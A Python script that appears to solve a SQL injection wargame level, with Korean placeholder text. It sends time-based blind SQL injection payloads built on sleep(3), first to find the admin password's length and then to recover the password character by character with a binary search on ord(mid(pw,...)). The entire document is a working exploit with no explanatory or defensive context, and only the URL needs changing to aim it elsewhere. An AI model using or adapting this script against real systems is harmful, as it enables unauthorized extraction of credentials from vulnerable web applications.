import requests
import time

url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"
cookies = { "PHPSESSID" : "쿠키값" }

def pw_length():
    length = 1

    while True:
        start_time = time.time()

        params = { "id" : "admin", "pw" : "' or id=\"admin\" and if(length(pw)={},sleep(3),1) #".format(length) }
        requests.get(url, params=params, cookies=cookies)

        if int(time.time() - start_time) == 3:
            return length
        else:
            length += 1

def pw_crack():
    password_length = pw_length()
    password = ''

    for i in range(1, password_length+1):
        start, end, mid = 1, 127, 64
        while True:
            start_time = time.time()
            
            params = { "id" : "admin", "pw" : "' or id=\"admin\" and if(ord(mid(pw, {}, 1))={},sleep(3),1) #".format(i, mid) }
            requests.get(url, params=params, cookies=cookies)

            if int(time.time() - start_time) == 3:
                password = password + chr(mid)
                print("패스워드:", password)
                break
            else:
                params = { "id" : "admin", "pw" : "' or id=\"admin\" and if(ord(mid(pw, {}, 1))>{},sleep(3),1) #".format(i, mid) }
                requests.get(url, params=params, cookies=cookies)

                if int(time.time() - start_time) == 3:
                    start = mid
                    mid = (mid + end) // 2
                else:
                    end = mid
                    mid = (start + end) // 2

pw_crack()